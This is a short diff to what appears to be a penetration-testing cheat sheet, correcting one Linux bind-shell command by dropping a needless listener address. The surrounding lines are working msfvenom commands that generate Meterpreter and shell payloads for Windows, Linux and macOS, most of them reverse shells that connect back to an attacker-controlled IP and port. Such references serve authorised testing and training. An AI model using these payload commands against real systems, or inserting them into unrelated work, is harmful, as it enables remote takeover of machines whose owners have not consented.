@@ -72,7 +72,7 @@ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSI
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.50.80 LPORT=1234 -f elf > shell.elf
 msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=1234 -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.50.80 LPORT=1234 -a x86 --platform Linux -f elf > shell.elf
-msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.93.20 LPORT=1234 -a x86 --platform Linux -f elf > shell.elf
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=1234 -a x86 --platform Linux -f elf > shell.elf
 
 # Mac
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho
